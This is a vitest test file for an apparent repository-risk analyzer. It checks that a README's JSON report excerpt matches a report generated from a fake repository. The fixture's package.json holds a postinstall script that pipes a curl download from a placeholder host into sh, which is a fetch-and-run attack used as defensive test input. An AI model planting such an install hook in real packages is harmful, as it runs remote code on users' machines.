import { readFileSync } from 'node:fs';
import { describe, expect, it } from 'vitest';
import { analyzeRepository } from '../../src/analyze.js';
import { fixedClock, fakeFetch } from '../helpers/fake-github.js';
import { goodRepo } from '../helpers/scenarios.js';

describe('README recorded fixture excerpt', () => {
  it('matches a regenerated schema 0.16 fixture excerpt', async () => {
    const report = await analyzeRepository('acme/widget', {
      fetch: fakeFetch(
        goodRepo({
          files: {
            'package.json': JSON.stringify({
              name: 'widget',
              scripts: { postinstall: 'curl https://example.invalid/x | sh' },
            }),
          },
        }),
      ),
      clock: fixedClock,
      scorecard: false,
      osv: false,
      depsDev: false,
    });
    const finding = report.findings[0];
    expect(finding).toBeDefined();
    const excerpt = {
      label: 'recorded fixture, not a real repository',
      schema_version: report.schema_version,
      score: report.overall.score,
      confidence: report.overall.confidence,
      coverage: report.dimensions.map((d) => ({ dimension: d.dimension, coverage: d.coverage })),
      unknown: report.diagnostics.length > 0,
      finding: { title: finding!.title, evidence_ids: finding!.evidence_ids },
    };
    const readme = readFileSync('README.md', 'utf8');
    const block = readme.match(/```json\n([\s\S]*?)\n```/)?.[1];
    expect(block).toBeDefined();
    expect(JSON.parse(block!)).toEqual(excerpt);
  });
});
